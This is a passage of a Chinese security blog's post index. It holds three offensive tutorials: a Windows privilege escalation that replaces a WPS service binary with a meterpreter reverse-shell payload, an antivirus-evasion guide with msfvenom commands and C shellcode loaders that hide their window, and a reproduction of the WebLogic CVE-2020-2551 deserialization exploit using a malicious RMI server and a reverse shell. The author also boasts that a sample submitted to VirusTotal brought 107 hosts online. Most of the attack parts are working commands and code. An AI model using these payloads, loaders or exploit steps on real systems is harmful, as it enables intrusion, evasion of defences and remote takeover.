查看文件权限，发现权限设置不当，标准用户可以对其更改(图找不到了，大概结果就像下面这样)，同时发现可以直接使用net命令来启动和停止其服务：<br><img src="https://i.loli.net/2020/09/06/pMJYBTNtlm3AfPq.png" alt="NT AUTHORITY\Authenticated Users:C"></p><p>现在条件都满足了，生成个马给这个文件替换了，重新启动服务不就完成提权了吗？快速操作中…<br>1、使用msfvenom生成一个exe-service类型的载荷：</p><pre><code class="shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=8522 -f exe-service -o wpscloudsvr.exe</code></pre><p><img src="https://i.loli.net/2020/09/06/MYqaP8yu9nQf7XZ.png" alt="exe-service"><br>2、上传并启动服务,并获得了会话:</p><pre><code class="shell">uplaod /xx/xx/wpscloudsvr.exe "D:\\Program Files\\WPS Office\\wpscloudsvr.exe"shell&gt;net start wpscloudsvr</code></pre><p><img src="https://i.loli.net/2020/09/06/kwdlUENItnpOHJ8.png"><br>这里就拿到了system权限的会话了：<br><img src="https://i.loli.net/2020/09/06/meE4iFVNKJnOBHf.png"></p><p><img src="https://i.loli.net/2020/09/06/dj4W8KmTiaMIEtl.png"><br>后面就是上远程桌面看看，加个管理员账户什么的：<br><img src="https://i.loli.net/2020/09/06/orWRgGIUk7ZubB1.png"></p><p><img src="https://i.loli.net/2020/09/06/6omMlNKGb3QZUz2.png"></p><h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h4><p>1、使用metasploit脚本进行自动化设置<br>2、metasploit本地提权漏洞扫描、利用，相关信息收集模块使用；<br>3、服务可执行文件权限设置不当的cacls检查、exe-service载荷生成、替换执行提权。</p><h4 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h4><p><a href="https://blog.csdn.net/l1028386804/article/details/86669614">https://blog.csdn.net/l1028386804/article/details/86669614</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows服务提权 </tag>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的源码免杀</title>
      <link href="/2020/08/30/jian-dan-de-yuan-ma-mian-sha/"/>
      <url>/2020/08/30/jian-dan-de-yuan-ma-mian-sha/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。 </p><h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2. shellcode生成和二进制文件编译"></a>2. shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="https://i.loli.net/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="https://i.loli.net/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="https://i.loli.net/2020/08/30/pxslvIq4YmhzaWL.jpg"></p><p>好了不说了，进入正题，首先我们使用msfvenom生成C语言shellcode:</p><pre><code class="c">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 12 -b '\x00' LHOST=192.168.8.102 LPORT=6666 -f c</code></pre><p><img src="https://i.loli.net/2020/08/30/GCZerU1cp9gEFH2.png" alt="msfvenom"><br>然后网上找了一段C语言加载shellcode的代码。。通过内联汇编加载shellcode：</p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#pragma comment(linker, "/OPT:nowin98")#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口unsigned char buf[] ="shellcode";int main(int argc,char const *argv[]){    //内联汇编    __asm       {        lea eax,buf;           call eax;       }}</code></pre><p>话不多说，先编译上线测试，启动msf监听：</p><pre><code class="shell">handler -p windows/meterpreter/reverse_http -H 0.0.0.0 -P 6666</code></pre><p> <img src="https://i.loli.net/2020/08/30/y7BndOlu3JG8PKt.png" alt="handler"><br> 另一边编译源码，生成exe:<br> <img src="https://i.loli.net/2020/08/30/oVZv6XKxrecbFAw.png" alt="Build_exe"><br> 双击执行exe,msf上线：<br> <img src="https://i.loli.net/2020/08/30/UyCWEo2DpJdAu84.png" alt="reverse_meterpreter"><br> 执行过程发现没有被拦截，看起来这已经免杀了：<br> <img src="https://i.loli.net/2020/08/30/RvXdq423TsuyhNE.png" alt="免杀成功"><br> 好的，免杀成功，本文结束。</p><h4 id="3-VS免杀测试"><a href="#3-VS免杀测试" class="headerlink" title="3. VS免杀测试"></a>3. VS免杀测试</h4><p>  结束是不可能结束的，不然怎么混篇幅，只能换个不免杀的编译器，被杀了再随便改改源码这样子。<br>  用VS2019来编译源码，启动vs:<br><img src="https://i.loli.net/2020/08/30/SWCNs72Iv8kcBxp.png" alt="start vs2019"></p><p><img src="https://i.loli.net/2020/08/30/rjUdwQhYV7m3Tpk.png" alt="创建项目"></p><p><img src="https://i.loli.net/2020/08/30/dmXu9wGJBg748rK.png" alt="复制代码编译"><br>是吧，被发现了，我们将恶意代码全部删除后编译，发现还是被杀：<br><img src="https://i.loli.net/2020/08/30/tVhmFpTIdPL9iBJ.png"><br>emmm? 怎么办啊，这都杀!? 其实有朋友应该注意到了下面这段代码，好吧 ，我是故意没删的，因为特征就是在这：</p><pre><code class="c">#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") </code></pre><p>接下来将这段代码删除，重新生成exe，然后进行扫描，发现成功过了杀软:<br><img src="https://i.loli.net/2020/08/30/lDvSHZB6jrOtFcU.png"></p><p>vs编译的这个内联加载不能正常上线，修改下加载方法：</p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include &lt;time.h&gt;int main(int argc, char const* argv[]){    unsigned char buf[] ="shellcode";    void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    memcpy(exec, buf, sizeof buf);    ((void(*)())exec)();    return 0;}</code></pre><p>那么编译执行后会有个DOS窗口：<br><img src="https://i.loli.net/2020/08/30/LVk8Qa3oDpbilH9.png"></p><p>这里我们<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">ShowWindow</a>函数来隐藏窗体：<br><img src="https://i.loli.net/2020/08/30/lf5rY1kmBswMRaq.png" alt="ShowWindow"><br>需要两个参数，一个是程序窗口句柄，可以通过<a href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">GetConsoleWindow</a> 来获得当前窗口句柄，另一个是int类型的nCmdShow，来控制窗口的状态，这里使用SW_HIDE来隐藏窗口：<br><img src="https://i.loli.net/2020/08/30/H5RLctbSJnQBorW.png" alt="nCmdShow"></p><pre><code class="c">ShowWindow(GetConsoleWindow(), SW_HIDE);</code></pre><p>然后再编译执行和免杀测试，可以看到免杀且无窗口：<br><img src="https://i.loli.net/2020/08/30/sQ1j6vhLouC5dOb.png"></p><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://www.zhihu.com/question/282945808">https://www.zhihu.com/question/282945808</a><br><a href="https://blog.csdn.net/zac_sian/article/details/46778285">https://blog.csdn.net/zac_sian/article/details/46778285</a><br><a href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">https://docs.microsoft.com/en-us/windows/console/getconsolewindow</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msfvenom免杀 </tag>
            
            <tag> C语言免杀 </tag>
            
            <tag> 隐藏程序窗口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic IIOP反序列化漏洞CVE-2020-2551复现</title>
      <link href="/2020/08/22/weblogic-iiop-fan-xu-lie-hua-lou-dong-cve-2020-2551-fu-xian/"/>
      <url>/2020/08/22/weblogic-iiop-fan-xu-lie-hua-lou-dong-cve-2020-2551-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><blockquote><p>2020年1月15日, Oracle官方发布了Weblogic IIOP反序列化漏洞CVE-2020-2551的漏洞通告，漏洞等级为高危，CVVS评分为9.8分，漏洞利用难度低。影响范围为10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0。</p></blockquote><h4 id="2-获取exp并配置编译"><a href="#2-获取exp并配置编译" class="headerlink" title="2. 获取exp并配置编译"></a>2. <a href="https://github.com/zzwlpx/weblogicPoc">获取exp</a>并配置编译</h4><p> <i class="far fa-hand-point-right"> 给项目配置JDK</i><br>  <img src="https://i.loli.net/2020/08/22/eqLaXfthxCWPFkb.png" alt="目录结构"></p><p>  <img src="https://i.loli.net/2020/08/22/MTPlbWHDxef7IaJ.png" alt="选择jdk"></p><p> <i class="far fa-hand-point-right"> 配置Modules</i><br> 选择src 后点 Sources,  选择out 后点 Excluded<br> <img src="https://i.loli.net/2020/08/22/94IgR1yeohwfvVc.png"><br> 选完之后，看到一排红：<br><img src="https://i.loli.net/2020/08/22/QzGhpBJ8mcwI4SE.png"><br> 这是因为有些包没导入，代码找不到，这里把lib文件夹下的包导入进项目：<br> <img src="https://i.loli.net/2020/08/22/HJzGVU4k5uQACiI.png"><br> 然后就没得报错了：<br><img src="https://i.loli.net/2020/08/22/sAg9FH5QVyDKwou.png"></p><p>  <i class="far fa-hand-point-right"> 打包配置</i><br>配置build:<br><img src="https://i.loli.net/2020/08/22/bSU72uhVIwdpGCn.png"><br>选择main函数：<br><img src="https://i.loli.net/2020/08/22/BR8ElPGQiuxXgew.png"><br>build打包成可执行文件：<br><img src="https://i.loli.net/2020/08/22/hKMricwEuIpgAJn.png"><br>发现又报错了，说没设置输出路径，配置一下:<br><img src="https://i.loli.net/2020/08/22/7mbKwzFtJElnU6g.png"></p><p><img src="https://i.loli.net/2020/08/22/l1fcKw7dn4mZpJe.png"><br>继续build，又报错：<br><img src="https://i.loli.net/2020/08/22/PxagBIbLeO8G9k6.png"><br>是上面的配置jdk下面那个project language level选高了 ，改成8，再来一次build，哇 成功输出文件：<br><img src="https://i.loli.net/2020/08/22/iX89Nomy2hObsAf.png"><br>马上就要运行一下，没问题了：<br><img src="https://i.loli.net/2020/08/22/BbRS5vzxPM2E8Gn.png"></p><p><img src="https://i.loli.net/2020/08/22/4i25J7BTXm1aNUQ.png"></p><h4 id="3-进行复现"><a href="#3-进行复现" class="headerlink" title="3. 进行复现"></a>3. 进行复现</h4><p><i class="far fa-hand-point-right">首测失败</i><br>用<a href="https://github.com/vulhub/vulhub">vulhub</a>搭建了一个weblogic环境，恶意rmi使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md">JNDI-Injection-Exploit</a>。但是这个工具编译版本为jdk1.7+,漏洞环境是jdk1.6，所以没成功，从下面日志中可以看到漏洞触发成功访问了rmi服务，但是接着报错不支持version 52，说明执行代码的jdk版本低于编译的jdk版本。搜到jdk版本和stanford parser对应关系是J2SE 8 = 52,J2SE 7 = 51,J2SE 6.0 = 50,J2SE 5.0 = 49,JDK 1.4 = 48,JDK 1.3 = 47,JDK 1.2 = 46,JDK 1.1 = 45，所以后面用指定编译版本为1.6编译exp。</p><p><img src="https://i.loli.net/2020/08/22/LnJFTZjINAUGHcO.png"></p><p><img src="https://i.loli.net/2020/08/22/pCW3QS8huHdq74i.png"><br><i class="far fa-hand-point-right">这下该成功了吧</i><br>1、使用<code>javac Poc.java -source 1.6 -target 1.6</code> 指定版本来编译Poc.java:<br><img src="https://i.loli.net/2020/08/22/v7rx1BlsGL63Hbq.png"><br>并且启动一个web服务来让恶意类可以被访问到<code>python3 -m http.server 80</code></p><p>2、恶意rmi服务<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.111.1/#Poc" 1099</code><br> <img src="https://i.loli.net/2020/08/22/tvqyw4ViMRDs6X2.png"><br> 3、用poc测试<code>java -jar CVE-2020-2551.jar 192.168.111.130 7001 rmi://192.168.111.1:1099/Poc</code><br> <img src="https://i.loli.net/2020/08/22/QWrdZmLjRFpC4k9.png"><br> 4、可以看到weblogic请求rmi后从web服务器里获取到了恶意类：<br><img src="https://i.loli.net/2020/08/22/3cKysEfCUx7w5uA.png"><br>5、此时上漏洞环境查看目录，命令执行成功：<br><img src="https://i.loli.net/2020/08/22/mOjkndpgSUhMAZX.png"><br>6、反弹shell：<br><img src="https://i.loli.net/2020/08/22/9te16OBNi8huVcP.png" alt="执行流程"></p><p><img src="https://i.loli.net/2020/08/22/k9sf8bBZaKXMTrI.png" alt="成功后的日志"></p><hr><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://blog.csdn.net/m0_37961948/article/details/78161828?utm_source=blogxgwz3">https://blog.csdn.net/m0_37961948/article/details/78161828?utm_source=blogxgwz3</a><br><a href="https://www.cnblogs.com/zhaoqingqing/p/11847791.html">https://www.cnblogs.com/zhaoqingqing/p/11847791.html</a><br><a href="https://blog.csdn.net/weixin_43149083/article/details/89639747">https://blog.csdn.net/weixin_43149083/article/details/89639747</a><br><a href="https://y4er.com/post/weblogic-cve-2020-2551/">https://y4er.com/post/weblogic-cve-2020-2551/</a><br><a href="https://xz.aliyun.com/t/7374#toc-13">https://xz.aliyun.com/t/7374#toc-13</a><br><a href="https://xz.aliyun.com/t/7498">https://xz.aliyun.com/t/7498</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic漏洞 </tag>
            
            <tag> IDEA编译 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
